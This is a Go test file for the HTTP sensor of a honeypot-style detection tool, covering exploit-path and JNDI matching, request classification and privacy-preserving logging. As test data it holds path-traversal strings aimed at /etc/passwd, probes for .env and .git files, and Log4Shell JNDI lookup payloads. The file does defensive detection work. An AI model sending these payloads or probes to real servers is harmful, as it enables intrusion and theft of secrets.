package trap

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/prometheus/client_golang/prometheus"
	"github.com/st0o0/ran/internal/alert"
	"github.com/st0o0/ran/internal/config"
	"github.com/st0o0/ran/internal/metrics"
)

func TestMatchExploitPath(t *testing.T) {
	t.Parallel()
	cases := []struct {
		path string
		want bool
	}{
		{"/.env", true},
		{"/.ENV", true},
		{"/app/../.env", true},
		{"/.env.production", true},
		{"/.git/config", true},
		{"/.git", true},
		{"/actuator", true},
		{"/actuator/health", true},
		{"/cgi-bin/luci", true},
		{"/cgi-bin", true},
		{"/phpMyAdmin/index.php", true},
		{"/wp-config.php.bak", true},
		{"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", true},
		{"/static/../../etc/passwd", true},
		{"/jenkins/script", true},
		{"/" + strings.Repeat("a", 1100) + "/../.env", true},
		{strings.Repeat("a", maxHTTPPath+1), true},
		{"/%2e%2e/%2e%2e/etc/passwd", true},
		{"/a/%252e%252e/secret", true},
		{"/%252e%252e/%252e%252e/etc/passwd", true},
		{"/a/..%5c..%5cwindows/win.ini", true},
		{`/a\..\b`, true},
		{"/.env;jsessionid=1", true},
		{"/a;x=1/.git/config", true},
		{"//.env", true},
		{"/./.env", true},
		{"/x/.env", true},
		{"/windows/win.ini", true},
		{"/actuator;a=b/env", true},
		{"/darwin.ini", false},
		{"/.environment", false},
		{"/myadministrator", false},
		{"/actuators", false},
		{"/phpmyadmin2", false},
		{"/docs/environment.html", false},
		{"/a.b/c..d/e", false},
		{"/gitignore", false},
		{"", false},
		{"/", false},
		{"/index.html", false},
		{"/robots.txt", false},
		{"/favicon.ico", false},
		{"/wp-login.php", false},
		{"/admin", false},
		{"/scripts/app.js", false},
		{"/about", false},
	}
	for _, tc := range cases {
		if got := matchExploitPath(tc.path); got != tc.want {
			t.Errorf("matchExploitPath(%q) = %v, want %v", tc.path, got, tc.want)
		}
	}
}

func TestMatchJNDI(t *testing.T) {
	t.Parallel()
	cases := []struct {
		in   string
		want bool
	}{
		{"${jndi:ldap://x/a}", true},
		{"${JNDI:rmi://x/a}", true},
		{"${${lower:j}ndi:ldap://x/a}", true},
		{"%24%7Bjndi:ldap://x/a%7D", true},
		{"Mozilla/5.0", false},
		{"${env:HOME}", false},
		{"jndi", false},
		{"", false},
		{strings.Repeat("a", 5000) + "${jndi:ldap://x/a}", false},
	}
	for _, tc := range cases {
		if got := matchJNDI(tc.in); got != tc.want {
			t.Errorf("matchJNDI(%.40q) = %v, want %v", tc.in, got, tc.want)
		}
	}
}

func TestSanitizeHTTPValue(t *testing.T) {
	t.Parallel()
	if got := sanitizeHTTPValue("a\r\nb\x00c"); got != "a  b c" {
		t.Errorf("control chars: got %q", got)
	}
	got := sanitizeHTTPValue(strings.Repeat("\u00e9", 300))
	if len(got) > maxHTTPValue || !utf8.ValidString(got) {
		t.Errorf("len = %d valid = %v", len(got), utf8.ValidString(got))
	}
	if got := sanitizeHTTPValue(strings.Repeat("x", 1000)); len(got) != maxHTTPValue {
		t.Errorf("len = %d, want %d", len(got), maxHTTPValue)
	}
}

func startHTTPSensor(t *testing.T) (string, *eventSink) {
	t.Helper()
	return startSensorTrap(t, "http", func(cfg *config.Config, l *slog.Logger, m *metrics.Metrics, lim *Limiter, r Reporter) Trap {
		return NewHTTP(cfg, l, m, lim, r)
	})
}

func httpDo(t *testing.T, addr, method, path string, headers map[string]string, body string) {
	t.Helper()
	req, err := http.NewRequest(method, "http://"+addr+path, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := (&http.Client{Transport: &http.Transport{DisableKeepAlives: true}, Timeout: 5 * time.Second}).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

func attackEvents(evs []alert.Event) []alert.Event {
	var out []alert.Event
	for _, e := range evs {
		if e.Class == alert.ClassAttack {
			out = append(out, e)
		}
	}
	return out
}

func waitAttack(t *testing.T, sink *eventSink) alert.Event {
	t.Helper()
	evs := sink.waitEvents(t, func(e []alert.Event) bool { return len(attackEvents(e)) > 0 })
	return attackEvents(evs)[0]
}

func TestHTTPRequestClassification(t *testing.T) {
	t.Parallel()
	json300 := `{"u":"` + strings.Repeat("a", 300-8) + `"}`
	if len(json300) != 300 {
		t.Fatalf("test body is %d bytes", len(json300))
	}
	cases := []struct {
		name      string
		method    string
		path      string
		headers   map[string]string
		body      string
		attack    bool
		wantPath  string
		wantBytes int
		wantAuth  int
		wantUser  string
	}{
		{name: "plain GET", method: "GET", path: "/index.html", headers: map[string]string{"User-Agent": "zgrab/0.x"}},
		{name: "robots", method: "GET", path: "/robots.txt"},
		{name: "HEAD", method: "HEAD", path: "/"},
		{name: "env file", method: "GET", path: "/.env", attack: true, wantPath: "/.env"},
		{name: "env with query", method: "GET", path: "/.env?token=secret", attack: true, wantPath: "/.env"},
		{name: "jndi header", method: "GET", path: "/", headers: map[string]string{"X-Api-Version": "${jndi:ldap://x/a}"}, attack: true, wantPath: "/"},
		{name: "jndi user agent", method: "GET", path: "/", headers: map[string]string{"User-Agent": "${jndi:ldap://x/a}"}, attack: true, wantPath: "/"},
		{name: "jndi in query", method: "GET", path: "/?q=%24%7Bjndi:ldap://x/a%7D", attack: true, wantPath: "/"},
		{name: "basic auth", method: "GET", path: "/", headers: map[string]string{"Authorization": "Basic YWRtaW46aHVudGVyMg=="}, attack: true, wantPath: "/", wantAuth: 1, wantUser: "admin"},
		{name: "bad basic", method: "GET", path: "/", headers: map[string]string{"Authorization": "Basic !!!"}},
		{name: "json post", method: "POST", path: "/api/login", headers: map[string]string{"Content-Type": "application/json"}, body: json300, attack: true, wantPath: "/api/login", wantBytes: 300},
		{name: "json put", method: "PUT", path: "/api/x", headers: map[string]string{"Content-Type": "application/json"}, body: `{"a":1}`, attack: true, wantPath: "/api/x", wantBytes: 7},
		{name: "form login", method: "POST", path: "/wp-login.php", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body: "log=admin&pwd=x", attack: true, wantPath: "/wp-login.php", wantAuth: 1, wantUser: "admin"},
		{name: "basic bare username", method: "GET", path: "/", headers: map[string]string{"Authorization": "Basic YWRtaW4="}, attack: true, wantPath: "/", wantAuth: 1, wantUser: "admin"},
		{name: "patch body", method: "PATCH", path: "/api/x", headers: map[string]string{"Content-Type": "application/json"}, body: `{"a":1}`, attack: true, wantPath: "/api/x", wantBytes: 7},
		{name: "oversized json body", method: "POST", path: "/api/big", headers: map[string]string{"Content-Type": "application/json"}, body: strings.Repeat("a", 20000), attack: true, wantPath: "/api/big", wantBytes: maxHTTPBody},
		{name: "empty post", method: "POST", path: "/login", attack: true, wantPath: "/login", wantAuth: 1},
		{name: "oversized form", method: "POST", path: "/login", headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body: "log=" + strings.Repeat("a", 20000), attack: true, wantPath: "/login", wantAuth: 1},
		{name: "jndi forwarded server", method: "GET", path: "/", headers: map[string]string{"X-Forwarded-Server": "${jndi:ldap://x/a}"}, attack: true, wantPath: "/"},
		{name: "lookalike path", method: "GET", path: "/darwin.ini"},
		{name: "environment path", method: "GET", path: "/.environment"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			addr, sink := startHTTPSensor(t)
			httpDo(t, addr, tc.method, tc.path, tc.headers, tc.body)
			if !tc.attack {
				// The probe event is emitted at session end; wait for it, then
				// check that nothing else was recorded.
				evs := sink.waitEvents(t, func(e []alert.Event) bool { return hasClass(e, alert.ClassProbe) })
				if len(evs) != 1 || evs[0].Class != alert.ClassProbe {
					t.Fatalf("want a single probe event, got %+v", evs)
				}
				return
			}
			evs := sink.waitEvents(t, func(e []alert.Event) bool { return len(attackEvents(e)) > 0 })
			att := attackEvents(evs)
			if len(att) != 1 {
				t.Fatalf("want exactly one attack event, got %+v", evs)
			}
			ev := att[0]
			if ev.Info.SourceIP != "127.0.0.1" {
				t.Errorf("source ip = %q", ev.Info.SourceIP)
			}
			if ev.Meta["path"] != tc.wantPath || ev.Meta["method"] != tc.method {
				t.Errorf("meta = %v", ev.Meta)
			}
			if tc.wantBytes > 0 && ev.Info.PayloadBytes != tc.wantBytes {
				t.Errorf("payload bytes = %d, want %d", ev.Info.PayloadBytes, tc.wantBytes)
			}
			if tc.wantAuth > 0 && (ev.Info.AuthAttempts != tc.wantAuth || ev.Meta["username"] != tc.wantUser) {
				t.Errorf("auth = %d meta = %v", ev.Info.AuthAttempts, ev.Meta)
			}
		})
	}
}

func TestHTTPExploitPathIsCommand(t *testing.T) {
	t.Parallel()
	addr, sink := startHTTPSensor(t)
	httpDo(t, addr, "GET", "/.env", nil, "")
	if ev := waitAttack(t, sink); ev.Info.Commands != 1 {
		t.Errorf("commands = %d, want 1", ev.Info.Commands)
	}
}

func TestHTTPUserAgentMetaBounded(t *testing.T) {
	t.Parallel()
	addr, sink := startHTTPSensor(t)
	httpDo(t, addr, "GET", "/.env", map[string]string{"User-Agent": strings.Repeat("A", 1000)}, "")
	if got := len(waitAttack(t, sink).Meta["user_agent"]); got != maxHTTPValue {
		t.Errorf("user_agent meta is %d bytes, want %d", got, maxHTTPValue)
	}
}

// A forwarded address is logged as claimed_client_ip and never becomes the alert
// identity or alert meta.
func TestHTTPSpoofedForwardedForKeepsPeerIP(t *testing.T) {
	t.Parallel()
	addr, sink := startHTTPSensor(t)
	httpDo(t, addr, "GET", "/.env", map[string]string{"X-Forwarded-For": "8.8.8.8", "X-Real-IP": "1.1.1.1"}, "")
	ev := waitAttack(t, sink)
	if ev.Info.SourceIP != "127.0.0.1" {
		t.Errorf("alert ip = %q, want the socket peer", ev.Info.SourceIP)
	}
	for k, v := range ev.Meta {
		if strings.Contains(v, "8.8.8.8") || strings.Contains(v, "1.1.1.1") {
			t.Errorf("meta %s=%q carries the forwarded address", k, v)
		}
	}
}

// Not parallel: the password log mode is package state.
func TestHTTPRequestLogging(t *testing.T) {
	SetPasswordLogMode("off")
	buf := &syncBuffer{}
	cfg := httpTestConfig(t)
	m := metrics.New(prometheus.NewRegistry(), "test")
	tr := NewHTTP(cfg, slog.New(slog.NewJSONHandler(buf, nil)), m, NewLimiter(10, 10), alert.NoopAlerter{})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	addr := serveTrap(t, ctx, tr)

	httpDo(t, addr, "GET", "/index.html?secret=1", map[string]string{
		"User-Agent":    "zgrab/0.x",
		"Cookie":        "session=topsecret",
		"Authorization": "Basic YWRtaW46aHVudGVyMg==",
		"Referer":       "https://example.com/",
	}, "")

	deadline := time.Now().Add(5 * time.Second)
	for !strings.Contains(buf.String(), `"action":"auth_attempt"`) && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	out := buf.String()
	for _, want := range []string{`"action":"probe"`, `"path":"/index.html"`, `"user_agent":"zgrab/0.x"`, `"method":"GET"`, `"username":"admin"`} {
		if !strings.Contains(out, want) {
			t.Errorf("log lacks %s:\n%s", want, out)
		}
	}
	for _, bad := range []string{"secret=1", "topsecret", "hunter2", "aHVudGVyMg"} {
		if strings.Contains(out, bad) {
			t.Errorf("log leaks %q:\n%s", bad, out)
		}
	}
}

// Several exploit requests on one keep-alive connection: the session is attack,
// every request is recorded as a command and nothing breaks.
func TestHTTPKeepAliveExploitRequests(t *testing.T) {
	t.Parallel()
	addr, sink := startHTTPSensor(t)
	client := &http.Client{Transport: &http.Transport{}, Timeout: 5 * time.Second}
	for _, p := range []string{"/.env", "/.git/config", "/actuator/env"} {
		resp, err := client.Get("http://" + addr + p)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	client.CloseIdleConnections()
	evs := sink.waitEvents(t, func(e []alert.Event) bool {
		for _, ev := range attackEvents(e) {
			if ev.Info.Commands == 3 {
				return true
			}
		}
		return false
	})
	for _, ev := range attackEvents(evs) {
		if ev.Info.SourceIP != "127.0.0.1" {
			t.Errorf("source ip = %q", ev.Info.SourceIP)
		}
	}
}

// A body that cannot be read completely (client gone) is not a credential login.
func TestHTTPBodyReadErrorIsNotLogin(t *testing.T) {
	t.Parallel()
	addr, sink := startHTTPSensor(t)
	conn := dialTrap(t, addr)
	if _, err := io.WriteString(conn, "POST /login HTTP/1.1\r\nHost: x\r\nContent-Length: 50\r\n\r\n"); err != nil {
		t.Fatal(err)
	}
	conn.Close()
	evs := sink.waitEvents(t, func(e []alert.Event) bool { return len(e) > 0 })
	for _, ev := range evs {
		if ev.Info.AuthAttempts != 0 || ev.Class != alert.ClassProbe {
			t.Errorf("read error counted as login: %+v", ev)
		}
	}
}

// The headers group carries the documented subset and never Cookie or Authorization.
func TestHTTPHeaderSubsetLogged(t *testing.T) {
	SetPasswordLogMode("off")
	buf := &syncBuffer{}
	cfg := httpTestConfig(t)
	m := metrics.New(prometheus.NewRegistry(), "test")
	tr := NewHTTP(cfg, slog.New(slog.NewJSONHandler(buf, nil)), m, NewLimiter(10, 10), alert.NoopAlerter{})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	addr := serveTrap(t, ctx, tr)

	httpDo(t, addr, "GET", "/index.html", map[string]string{
		"Cookie":          "session=topsecret",
		"Authorization":   "Bearer topsecret",
		"Referer":         "https://example.com/",
		"Accept-Language": "en",
		"X-Custom":        "nope",
	}, "")

	var headers map[string]any
	deadline := time.Now().Add(5 * time.Second)
	for headers == nil && time.Now().Before(deadline) {
		for _, line := range strings.Split(buf.String(), "\n") {
			var rec map[string]any
			if json.Unmarshal([]byte(line), &rec) == nil {
				if h, ok := rec["headers"].(map[string]any); ok {
					headers = h
				}
			}
		}
		time.Sleep(5 * time.Millisecond)
	}
	if headers == nil {
		t.Fatalf("no headers group logged:\n%s", buf.String())
	}
	if headers["referer"] != "https://example.com/" || headers["accept-language"] != "en" {
		t.Errorf("headers = %v", headers)
	}
	for _, bad := range []string{"cookie", "authorization", "x-custom"} {
		if _, ok := headers[bad]; ok {
			t.Errorf("headers group contains %q: %v", bad, headers)
		}
	}
}

func TestHTTPHasJNDIAllHeaderValues(t *testing.T) {
	t.Parallel()
	r, _ := http.NewRequest("GET", "http://x/", nil)
	r.Header.Add("X-Forwarded-For", "8.8.8.8")
	r.Header.Add("X-Forwarded-For", "${jndi:ldap://x/a}")
	if !httpHasJNDI(r) {
		t.Error("second header value not scanned")
	}
}
